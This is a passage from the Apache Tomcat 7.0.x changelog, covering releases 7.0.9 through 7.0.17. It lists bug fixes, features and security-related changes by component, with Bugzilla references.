runtime exception (e.g. OOME) occurs while creating a new user for a MemoryUserDatabase via JMX. (markt) | | fix | Fix an issue with the CrawlerSessionManagerValve that meant sessions were not always correctly tracked. (markt) | | fix | [51436](https://bz.apache.org/bugzilla/show_bug.cgi?id=51436): Send 100 (Continue) response earlier to enable ServletRequestListener implementations to read the request body. Based on a patch by Simon Olofsson. (markt) | | fix | Ensure an access log entry is made if an error occurs during asynchronous request processing and the socket is immediately closed. (markt) | | fix | Ensure that if asyncDispatch() is called during an onTimeout event and the target Servlet does not call startAsync() or complete() that Tomcat calls complete() once the target Servlet exits. (markt) | | fix | Improve the handling for Servlets that implement the deprecated SingleThreadModel when embedding Tomcat. (markt) | | fix | [51445](https://bz.apache.org/bugzilla/show_bug.cgi?id=51445): Correctly initialise all instances of Servlets that implement SingleThreadModel. Based on a patch by Felix Schumacher. (markt) | | fix | [51453](https://bz.apache.org/bugzilla/show_bug.cgi?id=51453): Fix a regression in the preemptive authentication support (enhancement [12428](https://bz.apache.org/bugzilla/show_bug.cgi?id=12428)) that could trigger authentication even if preemptive authentication was disabled. (markt) | | fix | Prevent possible NPE when serving Servlets that implement the SingleThreadModel interface. (markt) | | fix | In launcher for embedded Tomcat: do not change `catalina.home` system property if it had a value. (kkolinko) | | fix | When using Servlets that implement the SingleThreadModel interface, add the single instance created to the pool when it is determined that a pool of servlets is required rather than throwing it away. (markt) | |  | **Coyote** | | --- | | | fix | Fix unit test for bindOnInit which was failing for APR on some platforms. (rjung) | | --- | --- | | fix | Remove superfluous quotes from thread names for connection pools. (rjung) | | fix | Fix crash observed during pausing the connector when using APR. Only add socket to poller if we are sure we don't close it later. (rjung) | | update | Various refactorings to reduce code duplication and unnecessary code in the connectors. (markt) | | fix | Correct a regression introduced in Apache Tomcat 7.0.11 that broke certificate revocation list handling. (markt) | |  | **Jasper** | | --- | | | update | Improve the message printed by TldLocationsCache and add configuration example to the `logging.properties` file. (kkolinko) | | --- | --- | | fix | [33453](https://bz.apache.org/bugzilla/show_bug.cgi?id=33453): Recompile JSPs if last modified time of the source or any of its dependencies changes either forwards or backwards. Note that this introduces an incompatible change to the code generated for JSPs. Tomcat will automatically re-compile any JSPs and tag files found in the work directory when upgrading from 7.0.16 or earlier to 7.0.17 or later. If you later downgrade from 7.0.17 or later to 7.0.16 or earlier, you must empty the work directory as part of the downgrade process. (markt) | | fix | [36362](https://bz.apache.org/bugzilla/show_bug.cgi?id=36362): Handle the case where tag file attributes (which can use any valid XML name) have a name which is not a Java identifier. (markt/kkolinko) | | add | Broaden the exception handling in the EL Parser so that more failures to parse an expression include the failed expression in the exception message. Hopefully, this will help track down the cause of [51088](https://bz.apache.org/bugzilla/show_bug.cgi?id=51088). (markt) | |  | **Cluster** | | --- | | | fix | [51306](https://bz.apache.org/bugzilla/show_bug.cgi?id=51306): Avoid NPE when handleSESSION\_EXPIRED is processed while handleSESSION\_CREATED is being processed. (kfujino) | | --- | --- | | fix | Notifications of changes in session ID to other nodes in the cluster should be controlled by notifySessionListenersOnReplication rather than notifyListenersOnReplication. (markt) | | fix | The change in session ID is notified to the container event listener on the backup node in cluster. This notification is controlled by notifyContainerListenersOnReplication.(kfujino) | |  | **Web applications** | | --- | | | fix | Update Maven repository information in the documentation to reflect current usage. (markt) | | --- | --- | | add | [43538](https://bz.apache.org/bugzilla/show_bug.cgi?id=43538): Add host name and IP address to the HTML Manager application. Patch by Dennis Lundberg. (markt) | | fix | Add `session="false"` directive to the index page of the ROOT web application. (kkolinko) | | fix | [51443](https://bz.apache.org/bugzilla/show_bug.cgi?id=51443): Document the notifySessionListenersOnReplication attribute for the DeltaManager. (markt) | | fix | [51447](https://bz.apache.org/bugzilla/show_bug.cgi?id=51447): Viewing a back up session in the HTML Manager web application no longer changes the session to a primary session. Based on a patch provided by Eiji Takahashi. (markt) | |  | **Other** | | --- | | | fix | [33262](https://bz.apache.org/bugzilla/show_bug.cgi?id=33262): Install monitor to auto-start for current user only rather than all users to be consistent with menu item creation. (markt) | | --- | --- | | add | [40510](https://bz.apache.org/bugzilla/show_bug.cgi?id=40510): Provide an option to install shortcuts for the current user or all users. Also ensure registry is correctly cleaned on uninstall for 64-bit platforms. (markt) | | add | [50949](https://bz.apache.org/bugzilla/show_bug.cgi?id=50949): Provide the ability to specify the AJP port and service name when installing Tomcat using the Windows installer. This permits multiple instances of the same Tomcat version to be installed side-by-side. (markt) | | update | Clean up shell and batch scripts (improve consistency, clarify comments, add `configtest` command support for Windows). (rjung) | | fix | [51206](https://bz.apache.org/bugzilla/show_bug.cgi?id=51206): Make CATALINA\_BASE visible for setenv.sh. (rjung) | | update | Remove unnecessary variable BASEDIR from scripts. (rjung) | | fix | [51425](https://bz.apache.org/bugzilla/show_bug.cgi?id=51425), [51450](https://bz.apache.org/bugzilla/show_bug.cgi?id=51450): Update Spanish translations. Based on patches provided by Jesus Marin. (markt) | | | |  | **Tomcat 7.0.16 (markt)** | **released 2011-06-17** | | --- | --- | | | **Catalina** | | --- | | | fix | [51249](https://bz.apache.org/bugzilla/show_bug.cgi?id=51249): Further improve system property replacement code in ClassLoaderLogManager of Tomcat JULI to cover some corner cases. (kkolinko) | | --- | --- | | fix | [51264](https://bz.apache.org/bugzilla/show_bug.cgi?id=51264): Improve the previous fix for this issue by returning the connection to the pool when not in use so it does not appear to be an abandoned connection. Patch provided by Felix Schumacher. (markt) | | fix | [51324](https://bz.apache.org/bugzilla/show_bug.cgi?id=51324): Improve handling of exceptions when flushing the response buffer to ensure that the doFlush flag does not get stuck in the enabled state. Patch provided by Jeremy Norris. (markt) | | fix | Correct a regression in the fix for [51278](https://bz.apache.org/bugzilla/show_bug.cgi?id=51278) that prevented any web application from being marked as distributable. (kfujino/markt) | | fix | Correct a regression in the fix for [51278](https://bz.apache.org/bugzilla/show_bug.cgi?id=51278) that prevented a web application from overriding the default welcome files. (markt) | | fix | Enable remaining valves for Servlet 3 asynchronous processing support. (markt) | | fix | Avoid possible NPE when logging requests received during embedded Tomcat shutdown. (markt) | | fix | [51340](https://bz.apache.org/bugzilla/show_bug.cgi?id=51340): Fix thread-safety issue when parsing multiple web.xml files in parallel. Apache Tomcat does not do this but products that embed it may. (markt) | | fix | [51344](https://bz.apache.org/bugzilla/show_bug.cgi?id=51344): Fix problem with Lifecycle re-factoring for deprecated embedded class that prevented events being triggered. (markt) | | fix | [51348](https://bz.apache.org/bugzilla/show_bug.cgi?id=51348): Prevent possible NPE when processing WebDAV locks. (markt) | |  | **Coyote** | | --- | | | fix | When parsing the port in the HTTP host header, restrict the value to be base 10 integer digits rather than hexadecimal ones. (rjung/markt/kkolinko) | | --- | --- | | update | Various refactorings to reduce code duplication and unnecessary code in the connectors. (markt) | |  | **Jasper** | | --- | | | update | Change JAR scanning log messages where no TLDs are found to DEBUG level and replace the multiple messages with a single INFO level message that indicates that at least one JAR was scanned needlessly and how to obtain more info. (markt) | | --- | --- | |  | **Cluster** | | --- | | | fix | Enable Servlet 3 asynchronous processing support when using clustering. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Correct the log4j configuration settings when defining conversion patterns in the documentation web application. (markt) | | --- | --- | | | |  | **Tomcat 7.0.15 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [27122](https://bz.apache.org/bugzilla/show_bug.cgi?id=27122): Remove a workaround for a very old and since fixed Mozilla bug and change the default value of the securePagesWithPragma attribute of the Authenticator Valves to false. These changes should reduce the likelihood of issues when downloading files with IE. (markt) | | --- | --- | | fix | [35054](https://bz.apache.org/bugzilla/show_bug.cgi?id=35054): Check that a file is not specified for a Host's appBase and log an error if it is. (markt) | | fix | [51197](https://bz.apache.org/bugzilla/show_bug.cgi?id=51197): Fix possible dropped connection when sendError or sendRedirect are used during async processing. (markt) | | fix | [51221](https://bz.apache.org/bugzilla/show_bug.cgi?id=51221): Correct Spanish translation of text used in a 302 response. Patch provided by Paco Soberón. (markt) | | fix | [51249](https://bz.apache.org/bugzilla/show_bug.cgi?id=51249): Correct ClassLoaderLogManager system property replacement code so properties of the form "}${...}" can be used without error. (markt) | | fix | [51264](https://bz.apache.org/bugzilla/show_bug.cgi?id=51264): Allow the JDBC persistent session store to use a JNDI datasource to define the database in which sessions are persisted. Patch provided by Felix Schumacher. (markt) | | fix | [51274](https://bz.apache.org/bugzilla/show_bug.cgi?id=51274): Add missing i18n strings in PersistentManagerBase. Patch provided by Eiji Takahashi. (markt) | | fix | [51276](https://bz.apache.org/bugzilla/show_bug.cgi?id=51276): Provide an abstraction for accessing content in JARs so the most efficient method can be selected depending on the type of URL used to identify the JAR. This improves startup time when JARs are located in $CATALINA\_BASE/lib. (markt) | | fix | [51277](https://bz.apache.org/bugzilla/show_bug.cgi?id=51277): Improve error message if an application is deployed with an incomplete FORM authentication configuration. (markt) | | fix | [51278](https://bz.apache.org/bugzilla/show_bug.cgi?id=51278): Allow ServletContainerInitializers to override settings in the global default web.xml and the host web.xml. (markt) | | fix | [51310](https://bz.apache.org/bugzilla/show_bug.cgi?id=51310): When stopping the Server object on shutdown call destroy() after calling stop(). (markt) | |  | **Coyote** | | --- | | | add | [51145](https://bz.apache.org/bugzilla/show_bug.cgi?id=51145): Add an AJP-NIO connector. (markt/rjung) | | --- | --- | |  | **Jasper** | | --- | | | add | [51220](https://bz.apache.org/bugzilla/show_bug.cgi?id=51220): Add a system property to enable tag pooling with JSPs that use a custom base class. Based on a patch by Dan Mikusa. (markt) | | --- | --- | | add | Include a comment header in generated java files that indicates when the file was generated and which version of Tomcat generated it. (markt) | | fix | [51240](https://bz.apache.org/bugzilla/show_bug.cgi?id=51240): Ensure that maxConnections limit is enforced when multiple acceptor threads are configured. (markt) | |  | **Cluster** | | --- | | | fix | [51230](https://bz.apache.org/bugzilla/show_bug.cgi?id=51230): Add missing attributes to JMX for ReplicationValve and JvmRouteBinderValve. Patch provided by Eiji Takahashi. (markt) | | --- | --- | |  | **Web applications** | | --- | | | add | Add documentation for AJP-NIO connector. (markt/rjung) | | --- | --- | | fix | [51182](https://bz.apache.org/bugzilla/show_bug.cgi?id=51182): Document JAAS supported added in [51119](https://bz.apache.org/bugzilla/show_bug.cgi?id=51119). Patch provided by Neil Laurance. (markt) | | fix | [51225](https://bz.apache.org/bugzilla/show_bug.cgi?id=51225): Fix broken documentation links for non-English locales in the HTML Manager application. Patch provided by Eiji Takahashi. (markt) | | fix | [51229](https://bz.apache.org/bugzilla/show_bug.cgi?id=51229): Fix bugs in the Servlet 3.0 asynchronous examples. Patch provided by Eiji Takahashi. (markt) | | fix | [51251](https://bz.apache.org/bugzilla/show_bug.cgi?id=51251): Add web application version support to the Ant tasks. Based on a patch provided by Eiji Takahashi. (markt) | | fix | [51294](https://bz.apache.org/bugzilla/show_bug.cgi?id=51294): Clarify behaviour of unpackWAR attribute of StandardContext components. (markt) | |  | **Other** | | --- | | | fix | [46451](https://bz.apache.org/bugzilla/show_bug.cgi?id=46451): Configure svn:bugtraq properties for Tomcat trunk. Based on a patch provided by Marc Guillemot. (markt) | | --- | --- | | fix | [51309](https://bz.apache.org/bugzilla/show_bug.cgi?id=51309): Correct logic in catalina.sh stop when using a PID file to ensure the correct message is shown. Patch provided by Caio Cezar. (markt) | | | |  | **Tomcat 7.0.14 (markt)** | **released 2011-05-12** | | --- | --- | | | **Catalina** | | --- | | | update | Stylistic improvements to MIME type sync script. Based on a patch provided by Felix Schumacher. (rjung) | | --- | --- | | fix | Ensure that the SSLValve provides the SSL key size as an Integer rather than a String. (markt) | | fix | Ensure that the RemoteIpValve works correctly with Servlet 3.0 asynchronous requests. (markt) | | fix | Use safe equality test when determining event type in the MapperListener. (markt) | | fix | Use correct class loader when loading Servlet classes in StandardWrapper. (markt) | | add | Provide additional configuration options for the RemoteIpValve and RemoteIpFilter to allow greater control over the values returned by ServletRequest#getServerPort() and ServletRequest#getLocalPort() when Tomcat is behind a reverse proxy. (markt) | | fix | Ensure session cookie paths end in `/` so that session cookies created for a context with a path of `/foo` do not get returned with requests mapped to a context with a path of `/foobar`. (markt) | |  | **Jasper** | | --- | | | fix | [51177](https://bz.apache.org/bugzilla/show_bug.cgi?id=51177): Ensure Tomcat's MapElResolver always returns `Object.class` for `getType()` as required by the EL specification. (markt) | | --- | --- | | | |  | **Tomcat 7.0.13 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | Correct mix-up in Realm Javadoc. (markt) | | --- | --- | | fix | Fix display of response headers in AccessLogValve. (kkolinko) | | update | Implement display of multiple request headers in AccessLogValve: print not just the value of the first header, but of the all of them, separated by commas. (kkolinko) | | add | [50306](https://bz.apache.org/bugzilla/show_bug.cgi?id=50306): New StuckThreadDetectionValve to detect requests that take a long time to process, which might indicate that their processing threads are stuck. Based on a patch provided by TomLu. (slaurent) | | fix | [51038](https://bz.apache.org/bugzilla/show_bug.cgi?id=51038): Ensure that asynchronous requests are included in access logs. (markt) | | fix | [51042](https://bz.apache.org/bugzilla/show_bug.cgi?id=51042): Don't trigger session creation listeners when a session ID is changed as part of the authentication process. (markt) | | fix | [51050](https://bz.apache.org/bugzilla/show_bug.cgi?id=51050): Add additional common but non-standard file extension to MIME type mappings for MPEG 4 files. Based on a patch by Cédrik Lime. (markt) | | add | Add some additional common JARs that do not contain TLDs or web fragments to the list of JARs to skip when scanning for TLDs and web fragments. (markt) | | fix | While scanning JARs for TLDs and fragments, avoid using JarFile and use JarInputStream as in most circumstances where JARs are scanned, JarFile will create a temporary copy of the JAR rather than using the resource directly. This change significantly improves startup performance for applications with lots of JARs to be scanned. (markt) | | fix | Ensure response is committed when `AsyncContext#complete()` is called. (markt) | | add | Add a container event that is fired when a session's ID is changed, e.g. on authentication. (markt) | | fix | [51099](https://bz.apache.org/bugzilla/show_bug.cgi?id=51099): Correctly implement non-default login configurations (configured via the loginConfigName attribute) for the SPNEGO authenticator. (fhanik/markt) | | add | [51119](https://bz.apache.org/bugzilla/show_bug.cgi?id=51119): Add JAAS authentication support to the JMXRemoteLifecycleListener. Patch provided by Neil Laurance. (markt) | | add | [51136](https://bz.apache.org/bugzilla/show_bug.cgi?id=51136): Provide methods that enable the name of a Context on Context creation when using Tomcat in an embedded scenario. Based on a patch provided by David Calavera. (markt) | | fix | [51137](https://bz.apache.org/bugzilla/show_bug.cgi?id=51137): Add additional Microsoft Office MIME type mappings. (rjung) | | add | Partial sync of MIME type mapping with mime.types from the Apache web server. About 600 MIME types added, some changed. (rjung) | | fix | Make access logging more robust when logging requests that generate 400 responses since the request object is unlikely to be fully/correctly populated in that case. (markt) | |  | **Coyote** | | --- | | | fix | [50957](https://bz.apache.org/bugzilla/show_bug.cgi?id=50957): Fix regression in HTTP BIO connector that triggered errors when processing pipe-lined requests. (markt) | | --- | --- | | fix | [50158](https://bz.apache.org/bugzilla/show_bug.cgi?id=50158): Ensure the asynchronous requests never timeout if the timeout is set to zero or less. Based on a patch provided by Chris. (markt) | | fix | [51073](https://bz.apache.org/bugzilla/show_bug.cgi?id=51073): Throw an exception and do not start the APR connector if it is configured for SSL and an invalid value is provided for SSLProtocol. (markt) | | fix | Align all the connector implementations with the documented default setting for processorCache of 200. This changes the default from -1 (unlimited) for the AJP-BIO, AJP-APR and HTTP-APR connectors. Additional information was also added to the documentation on how to select an appropriate value. | | fix | Take account of time spent waiting for a processing thread when calculating connection and keep-alive timeouts for the HTTP BIO connector. (markt) | | fix | [51095](https://bz.apache.org/bugzilla/show_bug.cgi?id=51095): Don't trigger a NullPointerException when the SSL handshake fails with the HTTP-APR connector. Patch provided by Mike Glazer. (markt) | | fix | Improve handling in AJP connectors of the case where too large a AJP packet is received. (markt) | | fix | Restore the automatic disabling of HTTP keep-alive with the BIO connector once 75% of the processing threads are in use and make the threshold configurable. (markt) | | fix | Make pollerSize and maxConnections synonyms for the APR connectors since they perform the same function. (markt) | | fix | Use maxThreads rather than 10000 as the default maxConnections for the BIO connectors. (markt) | |  | **Jasper** | | --- | | | fix | [47371](https://bz.apache.org/bugzilla/show_bug.cgi?id=47371): Correctly coerce the empty string to zero when used as an operand in EL arithmetic. Patch provided by gbt. (markt) | | --- | --- | | add | Label JSP/tag file line and column numbers when reporting errors since it may not be immediately obvious what the numbers represent. (markt) | | fix | Correct a regression in the fix for [49916](https://bz.apache.org/bugzilla/show_bug.cgi?id=49916) that resulted in JSPs being compiled twice rather than just once. (markt) | | add | Log JARs that are scanned for TLDs where no TLD is found so that users can easily identify JARs that can be added to the list of JARs to skip. (markt) | | update | Use a single TLD location cache for a web application rather than one per JSP compilation to speed up JSP compilation. (markt) | | add | [51124](https://bz.apache.org/bugzilla/show_bug.cgi?id=51124): Refactor BodyContentImpl to assist in determining the root cause of this bug. Based on a patch by Ramiro. (markt) | |  | **Cluster** | | --- | | | fix | [50950](https://bz.apache.org/bugzilla/show_bug.cgi?id=50950): Correct possible NotSerializableException for an authenticated session when running with a security manager. (markt) | | --- | --- | |  | **Web applications** | | --- | | | update | Configure Security Manager How-To to include a copy of the actual conf/catalina.policy file when the documentation is built, rather than maintaining a copy of its content. (kkolinko) | | --- | --- | | fix | Fix broken stylesheet URL in XML based manager status output. (rjung) | | fix | [51156](https://bz.apache.org/bugzilla/show_bug.cgi?id=51156): Ensure session expiration option is available in Manager application was running web applications that were defined in server.xml. (markt) | |  | **Other** | | --- | | | update | Clarify error messages in \*.sh files to mention that if a script is not found it might be because execute permission is needed. (kkolinko) | | --- | --- | | update | Update Apache Commons Pool to 1.5.6. (markt) | | fix | [51135](https://bz.apache.org/bugzilla/show_bug.cgi?id=51135): Fix auto-detection of JAVA\_HOME for 64-bit Windows platforms that only have a 32-bit JVM installed. (markt) | | fix | [51154](https://bz.apache.org/bugzilla/show_bug.cgi?id=51154): Remove duplicate @deprecated tags in ServletContext Javadoc. Patch provided by sebb. (markt) | | fix | [51155](https://bz.apache.org/bugzilla/show_bug.cgi?id=51155): Add comments to @deprecated tags that have none. Patch provided by sebb. (markt) | | | |  | **Tomcat 7.0.12 (markt)** | **released 2011-04-06** | | --- | --- | | | **Catalina** | | --- | | | add | Automatically correct invalid paths when specified for Context elements inside server.xml and log a warning that the configuration has been corrected. (markt) | | --- | --- | | fix | Don't unpack WAR files if they are not located in the Host's appBase. (markt) | | fix | Don't log to standard out in SSLValve. (markt) | | fix | Handle the case where a web crawler provides an invalid session ID in the CrawlerSessionManagerValve. (markt) | | update | Update pattern used in CrawlerSessionManagerValve to that used by the ASF infrastructure team. (markt) | | fix | Remove unnecessary whitespace from MIME mapping entries in global web.xml file. (markt) | | fix | When using parallel deployment, correctly handle the scenario when the client sends multiple JSESSIONID cookies. (markt) | | add | [12428](https://bz.apache.org/bugzilla/show_bug.cgi?id=12428): Add support (disabled by default) for preemptive authentication. This can be configured per context. Based on a patch suggested by Werner Donn. (markt) | | fix | Make the CSRF nonce cache serializable so that it can be replicated across a cluster and/or persisted across Tomcat restarts. (markt) | | update | Resolve some refactoring TODOs in the implementation of the new Context attribute "swallowAbortedUploads". (markt) | | fix | Include the seed time when calculating the time taken to create SecureRandom instances for session ID generation, report excessive times (greater than 100ms) at INFO level and provide a value for the message key so a meaningful message appears in the logs. (markt) | | fix | Don't register Contexts that fail to start with the Mapper. (markt) | | add | [48685](https://bz.apache.org/bugzilla/show_bug.cgi?id=48685): Add initial support for SPNEGO/Kerberos authentication also referred to as integrated Windows authentication. This includes user authentication, authorisation via the directory using the user's delegated credentials and exposing the user's delegated credentials via a request attribute so applications can make use of them to impersonate the current user when accessing third-party systems that use a compatible authentication mechanism. Based on a patch provided by Michael Osipov. (markt) | | fix | HTTP range requests cannot be reliably served when a Writer is in use so prevent the DefaultServlet from attempting to do so. (kkolinko) | | fix | Protect the DefaultServlet from Valves, Filters and Wrappers that write content to the response. Prevent partial responses to partial GET requests in this case since the range cannot be reliably determined. Also prevent the DefaultServlet from setting a content length header since this too cannot be reliably determined. (markt) | | fix | [50929](https://bz.apache.org/bugzilla/show_bug.cgi?id=50929): When wrapping an exception, include the root cause. Patch provided by sebb. (markt) | | fix | [50991](https://bz.apache.org/bugzilla/show_bug.cgi?id=50991): Fix regression in fix for [25060](https://bz.apache.org/bugzilla/show_bug.cgi?id=25060) that called close on a JNDI resource while it was still available to the application. (markt) | | add | Provide a configuration option that lets the close method to be used for a JNDI Resource to be defined by the user. This change also disables using the close method unless one is explicitly defined for the resource and limits it to singleton resources. (markt) | | fix | Correctly track changes to context.xml files and trigger redeployment when copyXML is set to false. (markt) | | fix | [50997](https://bz.apache.org/bugzilla/show_bug.cgi?id=50997): Relax the requirement that directories must have a name ending in `.jar` to be treated as an expanded JAR file by the default JarScanner. Based on patch by Rodion Zhitomirsky. (markt) | | fix | Don't append the jvmRoute to a session ID if the jvmRoute is a zero length string. (markt) | | fix | Don't register non-singleton DataSource resources with JMX. (markt) | | add | CVE-2011-1184: Provide additional configuration options for the DIGEST authenticator. (markt) | | fix | Provide a workaround for Tomcat hanging during shutdown when running the unit tests. (markt) | |  | **Coyote** | | --- | | | add | [50887](https://bz.apache.org/bugzilla/show_bug.cgi?id=50887): Add support for configuring the JSSE provider used to convert client certificates. Based on a patch by pknopp. (markt) | | --- | --- | | fix | [50903](https://bz.apache.org/bugzilla/show_bug.cgi?id=50903): When a connector is stopped, ensure that requests that are currently in a keep-alive state and waiting for client data are not processed. Requests where processing has started will continue to completion. (markt) | | fix | [50927](https://bz.apache.org/bugzilla/show_bug.cgi?id=50927): Improve error message when SSLCertificateFile is not specified when using APR with SSL. Based on a patch provided by sebb. (markt) | | fix | [50928](https://bz.apache.org/bugzilla/show_bug.cgi?id=50928): Don't ignore keyPass attribute for HTTP BIO and NIO connectors. Based on a patch provided by sebb. (markt) | |  | **Cluster** | | --- | | | fix | Securely seed the SecureRandom instance used for UUID generation and report excessive creation time (greater than 100ms) at INFO level. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | [50924](https://bz.apache.org/bugzilla/show_bug.cgi?id=50924): Clean-up HTTP connector comparison table. (markt) | | --- | --- | | add | Slightly expanded the documentation of the Host element to clarify the relationship between host name and DNS name. (markt) | | fix | [50925](https://bz.apache.org/bugzilla/show_bug.cgi?id=50925): Update SSL how-to to take account of `keyPass` connector attribute. (markt) | | update | Improve Tomcat Logging documentation. (kkolinko) | | fix | Align the authenticator documentation and MBean descriptors with the implementation. (markt) | | fix | Prevent the custom error pages for the Manager and Host Manager applications from being accessed directly. (markt) | | fix | [50984](https://bz.apache.org/bugzilla/show_bug.cgi?id=50984): When using the Manager application ensure that undeployment fails if a file cannot be deleted. (markt) | |  | **Other** | | --- | | | update | Update Eclipse JDT complier to 3.6.2. (markt) | | --- | --- | | update | Update WSDL4J library to 1.6.2 (used by JSR 109 support in the extras package). (markt) | | update | Update optional CheckStyle library to 5.3. (markt) | | fix | [50911](https://bz.apache.org/bugzilla/show_bug.cgi?id=50911): Reduce noise generated during the build of the Windows installer so warnings are more obvious. Patch provided by sebb. (markt) | | fix | Further work to reduce compiler and validation warnings across the code base. (markt) | | | |  | **Tomcat 7.0.11 (markt)** | **released 2011-03-11** | | --- | --- | | | **Catalina** | | --- | | | fix | CVE-2011-1088: Completed fix. Don't ignore @ServletSecurity annotations. (markt) | | --- | --- | | add | [25060](https://bz.apache.org/bugzilla/show_bug.cgi?id=25060): Close Apache Commons DBCP 1.x datasources when the associated JNDI naming context is stopped (e.g. for a non-global DataSource resource on web application reload) to close remaining database connections immediately rather than waiting for garbage collection. (markt) | | add | [26701](https://bz.apache.org/bugzilla/show_bug.cgi?id=26701): Provide a mechanism for users to register their own `URLStreamHandlerFactory` objects. (markt) | | fix | [50855](https://bz.apache.org/bugzilla/show_bug.cgi?id=50855): Fix NPE on HttpServletRequest.logout() when debug logging is enabled. (markt) | | add | New context attribute "swallowAbortedUploads" allows to make request data swallowing configurable for requests that are too large. (rjung) | | fix | [50854](https://bz.apache.org/bugzilla/show_bug.cgi?id=50854): Add additional permissions required by the Manager application when running under a security Manager and support a shared Manager installation when $CATALINA\_HOME != CATALINA\_BASE. (markt) | | fix | [50893](https://bz.apache.org/bugzilla/show_bug.cgi?id=50893): Add additional information to the download README for the extras components. (markt) | | fix | Calling `stop()` and then `destroy()` on a connector incorrectly triggered an exception. (markt) | |  | **Coyote** | | --- | | | add | [48208](https://bz.apache.org/bugzilla/show_bug.cgi?id=48208): Allow the configuration of a custom trust manager for use in CLIENT-CERT authentication. (markt) | | --- | --- | | fix | Fix issues that prevented asynchronous servlets from working when used with the HTTP APR connector on platforms that support TCP\_DEFER\_ACCEPT. (markt) | |  | **Jasper** | | --- | | | fix | Correct possible threading issue in JSP compilation when development mode is used. (markt) | | --- | --- | | fix | [50895](https://bz.apache.org/bugzilla/show_bug.cgi?id=50895): Don't initialize classes created during the compilation stage. (markt) | | | |  | **Tomcat 7.0.10 (markt)** | **released 2011-03-08** | | --- | --- | | | **Catalina** | | --- | | | fix | CVE-2011-1088: Partial fix. Don't ignore @ServletSecurity annotations. (markt) | | --- | --- | | fix | [27988](https://bz.apache.org/bugzilla/show_bug.cgi?id=27988): Improve reporting of missing files. (markt) | | fix | [28852](https://bz.apache.org/bugzilla/show_bug.cgi?id=28852): Add URL encoding where missing to parameters in URLs presented by Ant tasks to the Manager application. Based on a patch by Stephane Bailliez. (markt) | | fix | Improve handling of SSL renegotiation by failing earlier when the request body contains more bytes than maxSavePostSize. (markt) | | fix | Improve shut down speed by not renewing threads during shut down when the `ThreadLocalLeakPreventionListener` is enabled. (markt) | |  | **Coyote** | | --- | | | add | [49284](https://bz.apache.org/bugzilla/show_bug.cgi?id=49284): Add SSL re-negotiation support to the HTTP NIO connector and extend test cases to cover CLIENT-CERT authentication. (fhanik/markt) | | --- | --- | | | |  | **Tomcat 7.0.9 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | [19444](https://bz.apache.org/bugzilla/show_bug.cgi?id=19444): Add an option to the JNDI realm to allow role searches to be performed by the authenticated user. (markt) | | --- | --- | | add | [21669](https://bz.apache.org/bugzilla/show_bug.cgi?id=21669): Add the ability to specify the roleBase for the JNDI Realm as relative to the users DN. Based on a patch by Art W. (markt) | | add | [22405](https://bz.apache.org/bugzilla/show_bug.cgi?id=22405): Add a new Lifecycle listener, `org.apache.catalina.security.SecurityListener` that prevents Tomcat from starting insecurely. It requires that Tomcat is not started as root and that a umask at least as restrictive as 0007 is used. This new listener is not enabled by default. (markt) | | fix | [48863](https://bz.apache.org/bugzilla/show_bug.cgi?id=48863): Better logging when specifying an invalid directory for a class loader. Based on a patch by Ralf Hauser. (markt/kkolinko) | | fix | [48870](https://bz.apache.org/bugzilla/show_bug.cgi?id=48870): Refactor to remove use of parallel arrays. (markt) | | add | Enhance the RemoteIpFilter and RemoteIpValve so that the modified remote address, remote host, protocol and server port may be used in an access log if desired. (markt) | | fix | Restore access to Environments, Resources and ResourceLinks via JMX which was lost in early 7.0.x re-factoring. (markt) | | update | Remove ServerLifecycleListener. This was already removed from server.xml and with the Lifecycle re-factoring is no longer required. (markt) | | add | Add additional checks to ensure that sub-classes of `org.apache.catalina.util.LifecycleBase` correctly implement the expected state transitions. (markt) | | fix | [50189](https://bz.apache.org/bugzilla/show_bug.cgi?id=50189): Once the application has finished writing to the response, prevent further reads from the request since this causes various problems in the connectors which do not expect this. (markt) | | fix | [50700](https://bz.apache.org/bugzilla/show_bug.cgi?id=50700): Ensure that the override attribute of context parameters is correctly followed. (markt) | | fix | [50721](https://bz.apache.org/bugzilla/show_bug.cgi?id=50721): Correctly handle URL decoding where the URL ends in %nn. Patch provided by Christof Marti. (markt) | | add | [50737](https://bz.apache.org/bugzilla/show_bug.cgi?id=50737): Add additional information when an invalid WAR file is detected. (markt) | | fix | [50748](https://bz.apache.org/bugzilla/show_bug.cgi?id=50748): Allow the content length header to be set up to the point the response is committed when a writer is being used. (markt) | | fix | [50751](https://bz.apache.org/bugzilla/show_bug.cgi?id=50751): When authenticating with the JNDI Realm, only attempt to read user attributes from the directory if attributes are required. (markt) | | fix | [50752](https://bz.apache.org/bugzilla/show_bug.cgi?id=50752): Fix typo in debug message in deprecated Embedded class. (markt) | | fix | [50789](https://bz.apache.org/bugzilla/show_bug.cgi?id=50789): Provide an option to enable ServletRequestListeners for forwards as required by some CDI frameworks. (markt) | | fix | [50793](https://bz.apache.org/bugzilla/show_bug.cgi?id=50793): When processing Servlet 3.0 async requests, ensure that the requestInitialized and requestDestroyed events are only fired once per request at the correct times. (markt) | | fix | [50802](https://bz.apache.org/bugzilla/show_bug.cgi?id=50802): Ensure that `ServletContext.getResourcePaths()` includes static resources packaged in JAR files in its output. (markt) | | add | Web crawlers can trigger the creation of many thousands of sessions as they crawl a site which may result in significant memory consumption. The new Crawler Session Manager Valve ensures that crawlers are associated with a single session - just like normal users - regardless of whether or not they provide a session token with their requests. (markt) | | fix | Don't attempt to start NamingResources for Contexts multiple times. (markt) | | fix | [50826](https://bz.apache.org/bugzilla/show_bug.cgi?id=50826): Avoid `IllegalArgumentException` if an embedded Tomcat instance that includes at least one Context is destroyed without ever being started. (markt) | | fix | Ensure a web application is taken out of service if the web.xml file is not valid. (kkolinko/markt) | | fix | Ensure Servlet 2.2 jspFile elements are correctly converted to use a leading '/' if missing. (markt) | | fix | [50836](https://bz.apache.org/bugzilla/show_bug.cgi?id=50836): Better documentation of the meaning of `Lifecycle.isAvailable()` and correct a couple of cases where this could incorrectly return true. (markt) | |  | **Coyote** | | --- | | | fix | [50780](https://bz.apache.org/bugzilla/show_bug.cgi?id=50780): Fix memory leak in APR implementation of AJP connector introduced by the refactoring for [49884](https://bz.apache.org/bugzilla/show_bug.cgi?id=49884). (markt) | | --- | --- | | fix | If server configuration errors and/or faulty applications caused the ulimit for open files to be reached, the acceptor threads for all connectors could enter a tight loop. This loop consumed CPU and 